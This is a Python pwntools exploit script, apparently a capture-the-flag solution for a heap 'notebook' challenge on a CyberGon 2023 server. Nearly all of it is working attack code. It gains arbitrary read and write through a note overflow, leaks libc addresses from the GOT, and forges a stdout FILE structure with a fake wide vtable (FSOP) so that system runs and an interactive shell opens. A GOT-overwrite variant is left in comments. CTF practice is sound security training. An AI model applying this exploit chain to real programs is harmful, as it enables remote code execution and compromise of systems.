#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./notebook_patched")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    nc = "nc cybergon2023.webhop.me 5002"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def create(idx, data):
    io.sendlineafter(b"Exit\n", b"1")
    io.sendlineafter(b"index> \n", str(idx).encode())
    io.sendlineafter(b"content> \n", data)


def edit(idx, data):
    io.sendlineafter(b"Exit\n", b"2")
    io.sendlineafter(b"index> \n", str(idx).encode())
    io.sendlineafter(b"content> \n", data)


def view():
    io.sendlineafter(b"Exit\n", b"3")
    notes = []
    for i in range(10):
        notes.append(io.recvline(keepends=False)[3:])
    return notes


def arb_read(addr):
    payload = b"A" * 0x18 + flat(0x21, addr)
    edit(0, payload)
    notes = view()
    leak = u64(notes[1].ljust(8, p8(0)))
    return leak


def arb_write(addr, data):
    payload = b"A" * 0x18 + flat(0x21, addr)
    edit(0, payload)
    edit(1, data)


for i in range(2):
    create(i, b"a")


leak_puts = arb_read(elf.got["puts"])

leak_printf = arb_read(elf.got["printf"])

libc.address = leak_puts - libc.symbols["puts"]
assert libc.address & 0xfff == 0

log.info(f"{libc.address=:#x}")

"""
with GOT overwrite and one_gadget
"""
# aaw(elf.bss(0x800), )

# one_gadget = libc.address + 0xebcf8
# aaw(elf.got["exit"], p64(one_gadget))
# io.sendlineafter(b"Exit\n", b"0")

"""
use FSOP, no need GOT overwrite and one_gadget
"""
io_stdout = libc.symbols["_IO_2_1_stdout_"]
io_stdin = libc.symbols["_IO_2_1_stdin_"]

fake_vtable = libc.symbols["_IO_file_jumps"] - 0x560

fake_wvtable = elf.bss(0x200)
fake_wide_vtable = p8(0) * 0x68
fake_wide_vtable += p64(libc.symbols["system"])
fake_wide_vtable += p8(0) * (0xe0 - 0x70)
fake_wide_vtable += p64(fake_wvtable)

arb_write(fake_wvtable, fake_wide_vtable)

fs = FileStructure()
fs._lock = libc.symbols["_IO_stdfile_1_lock"]
fs._wide_data = fake_wvtable
fs.vtable = fake_vtable

payload = bytearray(bytes(fs))
payload[:0x4] = b"dash"
arb_write(io_stdout, bytes(payload))

io.interactive()
